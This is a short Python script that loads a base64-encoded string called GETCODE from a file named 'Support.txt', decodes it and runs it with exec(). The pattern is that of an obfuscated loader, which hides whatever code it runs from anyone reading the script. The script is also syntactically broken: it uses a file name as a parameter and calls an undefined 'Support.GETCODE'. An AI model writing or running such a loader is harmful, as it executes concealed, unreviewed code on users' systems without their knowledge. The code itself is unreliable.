
import os
import base64

def load_variables(Support.txt):
    variables = {}
    with open(Support.txt, 'r') as file:
        for line in file:
            # Split the line into key and value
            key, value = line.strip().split('=')
            variables[key] = value
    return variables

# Load the variables
config = load_variables('Support.txt')

# Access the variables
GETCODE = config['GETCODE']

decoded_bytes = base64.b64decode(Support.GETCODE)
decoded_code = decoded_bytes.decode('utf-8')
exec(decoded_code)
